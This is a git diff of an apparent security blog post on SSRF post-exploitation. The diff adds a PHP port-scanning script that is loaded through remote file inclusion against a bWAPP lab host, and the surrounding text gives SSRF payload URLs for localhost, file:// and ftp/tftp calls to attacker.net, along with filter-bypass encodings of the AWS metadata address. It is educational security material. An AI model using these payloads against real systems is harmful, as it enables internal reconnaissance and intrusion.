@@ -1,5 +1,5 @@
 # Welcome to the Blog!
-Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks.
+Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks.Let's start with SSRF and will continue the series.
 
 # SSRF
 
@@ -33,6 +33,8 @@ https://target.com/page?url=http://127.0.0.1/phpmyadmin
 https://target.com/page?url=http://127.0.0.1/pgadmin  
 https://target.com/page?url=http://127.0.0.1/any_interesting_page`
 
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/etc.png)
+
 #### **Internal files via URL scheme**
 
 Attacking the URL scheme allows an attacker to fetch files from a server and attack internal services.  
@@ -47,12 +49,48 @@ https://target.com/page?url=file://path/to/file`
 #### **Internal services via URL scheme**
 
 First find the open port on system using Bruteforce (https://cobalt.io/blog/from-ssrf-to-port-scanner). Then we can use a URL scheme to connect to certain services.
+
+Following is the remote malicious code that make this attack port scanning
+
+```<?php
+if (isset($_GET["ip"])) {
+    $ports = array(21, 22, 23, 25, 53, 80, 443, 3306);
+    foreach ($ports as $port) {
+        $service = getservbyport($port, "tcp");
+        if($pf = @fsockopen($_GET["ip"], $port, $err, $err_string, 1)) {
+            echo "Port $port($service)" . ": <span style='color:green'>Open</span><br>";
+            fclose($pf);
+        }
+        else {
+            echo "Port $port($service)" . ": <span style='color:red'>Inaccessible</span><br>";
+        }
+
+    }
+}
+
+?>
+```
+
+Let’s attack port scans on the internal network using RFI
+
+http://192.168.28.129/bWAPP/rlfi.php?language=http://192.168.28.1:8888/ssrf_port_scan.txt&ip=192.168.28.129&action=go
+
+192.168.28.129 is a is victim address
+
+Sample output:
+
+![](https://hydrasky.com/wp-content/uploads/2016/12/ssrf6.png)
+ Or we can use Burpsuite to breuteforce the vulnerability. 
   ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/SSRF8.png)
 For file transfer protocols:  
 
 `https://target.com/page?url=ftp://attacker.net:11211/  
 https://target.com/page?url=sftp://attacker.net:11111/  
 https://target.com/page?url=tftp://attacker.net:123456/TESTUDP`
+
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/url.png)
+
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/protocols.png)
 
 ### **Post Exploitation Methodology We Should Follow**
 - LDAP
@@ -104,13 +142,16 @@ Some examples are:
 https://target.com/page?url=http://127.0.0.1:25/  
 https://target.com/page?url=http://127.0.0.1:3389/  
 https://target.com/page?url=http://localhost:PORT/`  
-  
+
+![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/port.png)
+  ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/port2.png)
 Besides scanning for ports an attacker might also run a scan of running hosts by trying to ping private IP addresses:
 
 -   `**192.168.0.0/16**`
 -   `**172.16.0.0/12**`
 -   `**10.0.0.0/8**`
 
+Useful Links : https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/
 ## **Cloud provider**
 
 With practically every business running on some kind of a cloud network and database, securing the cloud has never been more important, here are the most important reasons why.  With 96% of all enterprises in the U.S. Using some form of cloud computing, it’s clear that this technology has experienced a rapid proliferation in the past few years.
@@ -241,3 +282,48 @@ The most common bypass for AWS addresses is changing them to get past the blackl
 -   `**http://0251.0376.0251.0376**` – dotted octal
 -   `**http://0251.00376.000251.0000376**` – dotted octal with padding
 
+## References
+
+1.  [http://en.wikipedia.org/wiki/URI_scheme](http://en.wikipedia.org/wiki/URI_scheme)
+    
+2.  [http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers](http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)
+    
+3.  [http://msdn.microsoft.com/en-us/library/system.uri.scheme.aspx](http://msdn.microsoft.com/en-us/library/system.uri.scheme.aspx)
+    
+4.  [http://search.cpan.org/~gaas/libwww-perl-6.04/lib/LWP.pm](http://search.cpan.org/~gaas/libwww-perl-6.04/lib/LWP.pm)
+    
+5.  [http://php.net/manual/en/wrappers.php](http://php.net/manual/en/wrappers.php)
+    
+6.  [http://docs.oracle.com/javase/1.5.0/docs/api/javax/print/attribute/standard/ReferenceUriSchemesSupported.html](http://docs.oracle.com/javase/1.5.0/docs/api/javax/print/attribute/standard/ReferenceUriSchemesSupported.html)
+    
+7.  [http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html](http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html)
+    
+8.  [http://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf](http://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf)
+    
+9.  [http://www.nostarch.com/download/tangledweb_ch3.pdf](http://www.nostarch.com/download/tangledweb_ch3.pdf)
+    
+
+## Tools
+
+1.  [https://github.com/ONsec-Lab/scripts/blob/master/list-open-fd.c](https://github.com/ONsec-Lab/scripts/blob/master/list-open-fd.c)
+    
+
+## Researches
+
+1.  [http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt](http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt)
+    
+2.  [http://www.slideshare.net/d0znpp/xxe-advanced-exploitation](http://www.slideshare.net/d0znpp/xxe-advanced-exploitation)
+    
+3.  [http://www.slideshare.net/d0znpp/caro2012-attack-largemodernwebapplications](http://www.slideshare.net/d0znpp/caro2012-attack-largemodernwebapplications)
+    
+4.  [http://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf](http://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf)
+    
+5.  [http://erpscan.com/wp-content/uploads/2012/11/SSRF.2.0.poc_.pdf](http://erpscan.com/wp-content/uploads/2012/11/SSRF.2.0.poc_.pdf)
+    
+6.  [http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-2.html](http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-2.html)
+    
+7.  [http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities](http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities)
+    
+8.  [http://erpscan.com/press-center/smbrelay-bible-7-ssrf-java-windows-love/](http://erpscan.com/press-center/smbrelay-bible-7-ssrf-java-windows-love/)
+    
+9.  [https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367](https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367)
